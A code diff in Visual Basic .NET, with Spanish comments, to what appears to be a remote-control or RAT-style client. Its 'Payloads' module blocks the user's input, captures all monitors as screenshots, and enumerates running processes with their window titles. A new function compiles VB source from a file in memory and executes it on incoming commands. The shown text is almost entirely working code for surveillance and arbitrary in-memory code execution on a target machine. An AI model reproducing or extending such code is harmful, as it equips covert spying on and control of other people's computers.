@@ -3,6 +3,8 @@ Imports System.Runtime.Serialization.Formatters.Binary
 Imports Microsoft.Win32
 Imports System.IO.Compression
 Imports System.Net
+Imports System.CodeDom
+Imports System.Reflection
 Module Payloads
     Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
     Function Inputs(ByVal Status As Boolean) As String
@@ -97,10 +99,10 @@ Module Payloads
         Dim IMAGEN As Bitmap
         Try
             Dim BM As Bitmap
-            BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+            BM = New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width), Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
             Dim DIBUJO As Graphics
             DIBUJO = Graphics.FromImage(BM)
-            DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
+            DIBUJO.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, SystemInformation.VirtualScreen.Size)
             DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
             IMAGEN = New Bitmap(BM)
             Dim DIBUJO2 As Graphics
@@ -214,6 +216,38 @@ Module Payloads
             AddToLog("Extractor@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
+
+    Function AnotherCommandProcessor(ByVal command As String) As String
+        Try
+            'AVISO: No declaro el procesador afuera porque quiero matarlo al finalizar el proceso.
+            '   de esta forma se evita que el codigo quede andando de fondo. Quizas en un futuro el procesador
+            '   quede andando de fondo, asi podra almacenar variables, etc.
+            '   por ahora no, ya que sera asesinado al terminar esta funcion.
+            Dim myProcessor As Assembly
+            Dim mySupplier As New VBCodeProvider
+            Dim myCompilador = mySupplier.CreateCompiler
+            Dim myParam As New CodeDom.Compiler.CompilerParameters
+            myParam.GenerateExecutable = False 'No quiero ejecutable
+            myParam.GenerateInMemory = True 'Lo quiero en memoria
+            'myParam.OutputAssembly = "" 'Si quiero generar un simbolo
+            'myParam.ReferencedAssemblies.Add("") 'No quiero referencias a a DLLs o librerias.
+            Dim myResult As Compiler.CompilerResults = myCompilador.CompileAssemblyFromSource(myParam, My.Computer.FileSystem.ReadAllText(MyCommandProcessor))
+            myProcessor = myResult.CompiledAssembly
+
+            'Creo la instancia de la clase
+            Dim procesadorComandos = myProcessor.CreateInstance("BoroProcessor")
+
+            'Uso la clase y llamo al metodo, luego devuelvo lo devuelto
+            Dim valorDevuelto = procesadorComandos.Processor(command)
+            If valorDevuelto <> Nothing Then
+                Return valorDevuelto
+            Else
+                Return command & " processed with 'own' processor."
+            End If
+        Catch ex As Exception
+            Return AddToLog("AnotherCommandProcessor@Payloads", "Error: " & ex.Message, True)
+        End Try
+    End Function
 End Module
 Module WindowsActions
 
@@ -240,7 +274,7 @@ Module WindowsActions
             Return AddToLog("ProcessStop@WindowsActions", "Error: " & ex.Message, True)
         End Try
     End Function
-    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 22/04/2022 19:23
+    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 17/05/2022 00:04
         Try
             Dim retorno As String = Nothing
             retorno = vbCrLf
@@ -258,6 +292,16 @@ Module WindowsActions
                 Else
                     retorno = "False"
                 End If
+                For Each proceso As Process In proc
+                    retorno &= vbCrLf & "   ProcessName: " & proceso.ProcessName &
+                        vbCrLf & "  Id: " & proceso.Id &
+                        vbCrLf & "  MachineName: " & proceso.MachineName &
+                        vbCrLf & "  MainWindowTitle: " & proceso.MainWindowTitle &
+                        vbCrLf & "  Responding: " & proceso.Responding &
+                        vbCrLf & "  StartTime: " & proceso.StartTime &
+                        vbCrLf & "  BasePriority: " & proceso.BasePriority &
+                        vbCrLf
+                Next
             End If
             Return retorno
         Catch ex As Exception
